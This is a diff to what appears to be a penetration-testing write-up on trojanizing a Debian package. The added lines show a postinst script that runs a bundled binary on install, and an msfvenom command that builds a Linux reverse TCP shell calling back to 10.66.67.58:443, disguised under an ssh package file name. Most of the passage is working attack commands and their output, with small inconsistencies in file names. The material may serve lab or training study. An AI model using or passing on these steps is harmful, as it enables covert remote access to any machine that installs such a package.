@@ -797,9 +797,35 @@ Description: ssh - secure shell client and server (metapackage)
 In the DEBIAN directory, create a file named control that contains the above. We also need to create a post-installation script that will execute our binary. In our DEBIAN directory, we’ll create a file named postinst that contains the following:
 
 ```shell
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/Exploit/mal_deb/work/DEBIAN]
+└─$ cat postinit 
+#!/bin/sh
+
+sudo chmod 2755 /usr/games/ssh_8.2p1-4_all && /usr/games/ssh_8.2p1-4_all & /usr/games/ssh_8.2p1-4_all &
+```
+now let's create a reverse shell
 
 ```
-
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/PTD/Exploit/mal_deb/work]
+└─$ cd usr/games 
+                                                                                                                                                                                                                                                                                                                            
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/mal_deb/work/usr/games]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.66.67.58 LPORT=443 -f elf -o  	ssh_8.2p1-4_all        
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: ssh
+                                                                    
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/…/mal_deb/work/usr/games]
+└─$ ls -al 
+total 12
+drwxrwxr-x 2 n16hth4wk n16hth4wk 4096 May 25 13:16 .
+drwxr-xr-x 4 n16hth4wk n16hth4wk 4096 May 25 13:14 ..
+-rw-rw-r-- 1 n16hth4wk n16hth4wk  194 May 25 13:16 ssh_8.2p1-4_all
+```
+Now we’ll create our malicious payload. We’ll be creating a reverse shell to connect back to us named `ssh_8.2p1-4_all`.
 
 
 
